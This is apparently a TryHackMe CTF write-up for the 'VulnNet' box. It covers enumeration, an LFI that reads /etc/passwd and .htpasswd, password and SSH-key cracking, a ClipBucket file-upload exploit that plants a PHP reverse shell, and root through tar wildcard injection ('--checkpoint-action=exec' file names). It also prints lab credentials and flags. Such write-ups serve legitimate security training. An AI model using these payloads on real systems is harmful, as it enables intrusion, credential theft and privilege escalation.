> Vulnet

**export IP=10.10.230.175**

# Nmap

nmap -sC -sV -T4 -Pn -p- -vvv -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
```

# Gobuster

sudo gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,bak,zip,js,bin,cgi -o gobuster/initial

```
/img (Status: 301)
/index.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/LICENSE.txt (Status: 200)
```

# Subdomains

sudo gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 -u http://vulnnet.thm

```
Found: gc._msdcs.vulnnet.thm (Status: 400) [Size: 424]
Found: broadcast.vulnnet.thm (Status: 401) [Size: 468] => But requires authentication
```

# Nikto

nikto -h http://$IP

```
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.html: Admin login page/section found.
```

Pretty much good at everything and we can't find anything for now. Let's try to examine .js files.

## js/index__d8338055.js

```
n.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "http://vulnnet.thm/index.php?referer=", n(n.s = 0) => Let's try to LFI
}({
    0: function(e, t, n) {
        e.exports = n("O14P")
    },
    O14P: function(e, t, n) {
``` 

# POC => http://10.10.73.202/index.php?referer=/etc/passwd => We have 2 users server-management and root

Since we have LFI and HTTP BASIC AUTHORIZATION FORM passwords are stored in .htpasswd. 
Accessing `http://10.10.73.202/index.php?referer=/etc/apache2/.htpasswd`. 
We have credentials `developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0`. Let's crack it using john.

john --wordlist=rockyou.txt hash => `9972761drmfsls` is the password for developers.
Now we can access `broadcast.vulnnet.thm`. We got `ClipBucket v4.0` and searching in searchsploit we got 

Upload arbitrary files

```
$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/photo_uploader.php"
```
## Payload

```
curl -u developers:9972761drmfsls -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"

creating file{"success":"yes","file_name":"1617209220b60198","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
```

Accessing `http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1617209220b60198.php` we have a shell.

# /var/www/html/include/dbconnect.php

```
<?php

	/**
	* @Software : ClipBucket
	* @License : CBLA
	* @version :ClipBucket v2.1
	*/

	$BDTYPE = 'mysql';
	//Database Host
	$DBHOST = '';
	//Database Name
	$DBNAME = 'VulnNet';
	//Database Username
	$DBUSER = 'admin';
	//Database Password
	$DBPASS = 'VulnNetAdminPass0990';
	//Setting Table Prefix
	define('TABLE_PREFIX','cb_');


    $db = new Clipbucket_db();

    $db->connect($DBHOST,$DBNAME,$DBUSER,$DBPASS);

/*
	require 'adodb/adodb.inc.php';

	$db             = ADONewConnection($BDTYPE);
	$db->debug      = false;
	$db->charpage   = 'cp_utf8';
	$db->charset    = 'utf8';
	if(!$db->Connect($DBHOST, $DBUSER, $DBPASS, $DBNAME))
	{
	    exit($db->ErrorMsg());
	}
	$db->Connect($DBHOST, $DBUSER, $DBPASS, $DBNAME);
	
        $db->SetFetchMode(ADODB_FETCH_ASSOC); 
        
	$db->Execute('SET NAMES utf8');
	$db->Execute('SET CHARACTER SET utf8');
	$db->Execute('SET COLLATION_CONNECTION="utf8_general_ci"');
*/

?>
```

We got some creds. Let's looks for backups.

/var/backups

```
-rw-rw-r--  1 server-management server-management    1484 Jan 24 14:08 ssh-backup.tar.gz
```

Let's download it! And extract it. Now we can crack it using ssh2john and john. Now we have the password!

1. python2 /usr/share/john/ssh2john.py id_rsa > new_hash.txt
2. john --wordlist=/usr/share/wordlists/rockyou.txt new_hash.txt => oneTWO3gOyac     (id_rsa)

# users.txt

```
THM{907e420d979d8e2992f3d7e16bee1e8b}
```

# Privilege Escalation

## /etc/crontab

`*/2   * * * *	root	/var/opt/backupsrv.sh`

# /var/opt/backupsrv.sh

```
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

tar command is being used here. Let's try looking in for wildcard privilege

```
echo "chmod u+s /bin/bash" > privesc.sh
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "" > --checkpoint=1
ls- la /bin/bash
```

# root.txt

```
THM{220b671dd8adc301b34c2738ee8295ba}
```